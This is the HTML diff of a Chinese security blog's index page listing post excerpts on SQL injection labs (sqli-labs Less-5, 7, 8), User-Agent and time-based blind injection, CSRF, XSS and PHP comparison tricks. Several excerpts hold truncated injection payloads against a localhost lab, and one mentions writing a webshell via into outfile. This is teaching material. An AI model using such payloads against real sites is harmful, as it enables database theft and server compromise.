+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" target="_self">
+        <div>
+          User-Agent 注入我们访问 http://127.0.0.1/sqli/Less-18/，页面显示一个登陆框和我们的ip信息。 当我们输入正确的用户名和密码之后登陆之后，页面多显示了 浏览器的User-Agent。  抓包，修改其User-Agent如下图，测试是否存在user-agent注入  页面报错，存在报错注入  ​&#39; and extractvalue(1,concat(0
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
   
-    <a href="/" class="mobile-nav-link">Home</a>
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
   
-</nav>
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="category-chain-item">注入漏洞</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="category-chain-item">SQL注入</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="category-chain-item">sql注入总结</a>
+  
+  
+
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/User-Agent-%E6%B3%A8%E5%85%A5/">#User-Agent 注入</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="时间盲注">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" target="_self">
+          时间盲注
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" target="_self">
+        <div>
+          时间盲注​Timing Attack注入，也就是时间盲注​。通过简单的条件语句比如 and 1=2 是无法看出异常的。 在MySQL中，有一个Benchmark()​函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。 因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="category-chain-item">注入漏洞</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="category-chain-item">SQL注入</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="category-chain-item">sql注入总结</a>
+  
+  
+
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">#时间盲注</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-7/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="Less-7">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-7/" target="_self">
+          Less-7
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-7/" target="_self">
+        <div>
+          Less-7这一次闭合类型试判断为((‘’)) 这一关多了一个小tips告诉我要用到outfile  我们在写入信息的时候希望多余的信息不要，那么我们就将id报错，或者说没有也就是加上负号-  我们可以上传一句话木马，也可以查询版本和数据库 写入一句话木马用into outfile函数 ‍ payload ​http://127.0.0.1/sqli-labs/Less-7/ ?id=-1&#39
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="category-chain-item">注入漏洞</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="category-chain-item">SQL注入</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" class="category-chain-item">sql注入靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="category-chain-item">sql——labs</a>
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Less-7/">#Less-7</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-8/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="Less-8">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-8/" target="_self">
+          Less-8
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-8/" target="_self">
+        <div>
+          Less-8方法一布尔盲注 ·1.http://127.0.0.1/sgli/Less-8/?id=1&#39;​判断此时存在注入漏洞·2.http://127.0.0.1/sgli/Less-8/?id=1&#39; order by 3 --+​当3改为4的时候，you are in…消失，说明存在三列。·3.http://127.0.0.1/sali/Less-8/?id=1&#39; an
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="category-chain-item">注入漏洞</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="category-chain-item">SQL注入</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" class="category-chain-item">sql注入靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="category-chain-item">sql——labs</a>
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Less-8/">#Less-8</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less%E2%80%945(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="Less—5(布尔盲注)">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less%E2%80%945(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/" target="_self">
+          Less—5(布尔盲注)
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less%E2%80%945(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/" target="_self">
+        <div>
+          Less—5(布尔盲注) 只会回显你已经进入，很明显的布尔盲注 流程1.检查注入点注入类型 http://127.0.0.1/sqli-labs/Less-5/?id=1‘  2.检查有多少列 http://127.0.0.1/sqli-labs/Less-5/?id=1‘ order by 3–+  3.开始猜测爆破 http://127.0.0.1/sqli-labs/Less-5/?id=1
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="category-chain-item">注入漏洞</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="category-chain-item">SQL注入</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" class="category-chain-item">sql注入靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="category-chain-item">sql——labs</a>
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Less%E2%80%945-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">#Less—5(布尔盲注)</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2024/05/20/Web/CSRF/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="CSRF">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/05/20/Web/CSRF/" target="_self">
+          CSRF
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2024/05/20/Web/CSRF/" target="_self">
+        <div>
+          CSRF一、什么是CSRF? CSRF (Cross-site request forgery跨站请求伪造)也称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。 简单的说，是攻击者通过一些技术
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-05-20 00:00" pubdate>
+              2024-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/CSRF/">#CSRF</a>
+            
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">#网络安全</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="HTTP/HTTPS 简介">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/" target="_self">
+          HTTP/HTTPS 简介
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/" target="_self">
+        <div>
+          HTTP教程HTTP&#x2F;HTTPS 简介HTTP（超文本传输协议，Hypertext Transfer Protocol） 是一种用于从网络传输超文本到本地浏览器的传输协议。它定义了客户端与服务器之间请求和响应的格式。HTTP 工作在 TCP&#x2F;IP 模型之上，通常使用端口 80。 HTTPS（超文本传输安全协议，Hypertext Transfer Protocol Secure
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-05-20 00:00" pubdate>
+              2024-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/HTTP/">#HTTP</a>
+            
+              <a href="/tags/HTTPS/">#HTTPS</a>
+            
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/">#网络协议</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2024/05/20/Web/XSS/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="XSS跨站脚本攻击">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/05/20/Web/XSS/" target="_self">
+          XSS跨站脚本攻击
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2024/05/20/Web/XSS/" target="_self">
+        <div>
+          XSS 跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的 Web 漏洞，利用该漏洞，攻击者可以在受害者浏览器中注入并执行恶意脚本。在 CTF（Capture The Flag）竞赛中，XSS 攻击不仅是一种考察 Web 安全基础的攻击技术，同时也是非常实用的进阶手段，可以用来窃取敏感信息、绕过访问控制或结合 CSRF（跨站请求伪造）实现更复杂的链式攻击。 本文将介
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-05-20 00:00" pubdate>
+              2024-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/XSS/">#XSS</a>
+            
+              <a href="/tags/%E5%AE%89%E5%85%A8/">#安全</a>
+            
+              <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/">#跨站脚本</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20content-type/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="HTTP Content-Type详解">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20content-type/" target="_self">
+          HTTP Content-Type详解
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20content-type/" target="_self">
+        <div>
+          HTTP content-typeContent-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。 Content-Type 标头告诉客户端实际返回的内容的内容类型。 语法格式： 12Content-Type: text
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-05-20 00:00" pubdate>
+              2024-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/" class="category-chain-item">HTTP教程</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/HTTP/">#HTTP</a>
+            
+              <a href="/tags/Content-Type/">#Content-Type</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="PHP强比较漏洞">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/" target="_self">
+          PHP强比较漏洞
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/" target="_self">
+        <div>
+          强比较1. MD5 碰撞（Collision Attack）原理MD5 算法存在碰撞漏洞，即两个不同的输入可以生成相同的 MD5 哈希值。适用于 md5($a) === md5($b)​ 且 $a !== $b​ 的情况。 示例12$a = &quot;240610708&quot;;  // md5: 0e462097431906509019562988736854$b = &quot;QNKC
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-05-20 00:00" pubdate>
+              2024-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/" class="category-chain-item">PHP安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/PHP/">#PHP</a>
+            
+              <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/">#比较漏洞</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+
+
+  <nav aria-label="navigation">
+    <span class="pagination" id="pagination">
+      <a class="extend prev" rel="prev" href="/page/8/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/#board">7</a><a class="page-number" href="/page/8/#board">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/#board">10</a><a class="extend next" rel="next" href="/page/10/#board"><i class="iconfont icon-arrowright"></i></a>
+    </span>
+  </nav>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="/js/jquery.min.js/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
